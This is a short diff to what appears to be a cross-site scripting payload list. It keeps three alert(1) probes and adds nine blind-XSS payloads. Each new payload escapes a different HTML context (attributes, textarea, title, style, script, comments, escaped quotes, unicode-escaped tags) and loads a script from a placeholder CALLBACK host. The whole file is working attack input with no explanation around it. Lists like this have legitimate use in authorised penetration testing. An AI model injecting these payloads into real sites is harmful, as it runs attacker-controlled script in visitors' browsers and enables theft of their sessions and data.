@@ -1,3 +1,12 @@
 <script>alert(1)</script>
 "><script>alert(1)</script>
 '><img src=x onerror=alert(1)>
+"><script src=https://CALLBACK></script>
+'><script src=https://CALLBACK></script>
+</textarea><script src=https://CALLBACK></script>
+</title><script src=https://CALLBACK></script>
+</style><script src=https://CALLBACK></script>
+</script><script src=https://CALLBACK></script>
+--><script src=https://CALLBACK></script>
+\"><script src=https://CALLBACK></script>
+\u003cscript src=https://CALLBACK\u003e\u003c/script\u003e
